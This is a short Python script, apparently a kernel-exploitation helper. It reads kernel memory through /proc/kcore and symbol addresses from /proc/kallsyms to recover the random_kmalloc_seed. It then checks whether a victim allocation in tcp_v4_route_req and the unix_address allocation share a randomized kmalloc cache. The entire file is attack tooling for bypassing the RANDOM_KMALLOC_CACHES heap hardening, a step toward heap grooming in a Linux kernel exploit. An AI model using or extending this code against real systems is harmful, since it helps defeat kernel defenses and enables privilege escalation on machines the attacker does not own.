#!/usr/bin/env python3
"""unix_match.py - victim save_options cache == unix_address cache."""
import struct


def rd(va, n):
    f = open('/proc/kcore', 'rb')
    h = f.read(64)
    off = struct.unpack_from('<Q', h, 0x20)[0]
    es = struct.unpack_from('<H', h, 0x36)[0]
    en = struct.unpack_from('<H', h, 0x38)[0]
    f.seek(off)
    for _ in range(en):
        ph = f.read(es)
        t = struct.unpack_from('<I', ph, 0)[0]
        po, pv, pp, pf = struct.unpack_from('<QQQQ', ph, 8)
        if t == 1 and pv <= va < pv + pf:
            f.seek(po + va - pv)
            return f.read(n)
    return None


s = {}
for line in open('/proc/kallsyms'):
    p = line.split()
    if len(p) >= 3:
        try:
            s[p[2]] = int(p[0], 16)
        except ValueError:
            pass
seed = struct.unpack('<Q', rd(s['random_kmalloc_seed'], 8))[0]
GOLD = 0x61C8864680B583EB
M = (1 << 64) - 1


def idx(c):
    return (((c ^ seed) & M) * GOLD & M) >> 60


v = idx(s['tcp_v4_route_req'] + 0x91)
u = idx(s['unix_create_addr'] + 0x29)
print("seed=%#x victim=%d unix=%d %s" %
      (seed, v, u, "UNIX2" if v == u else "nomatch"))
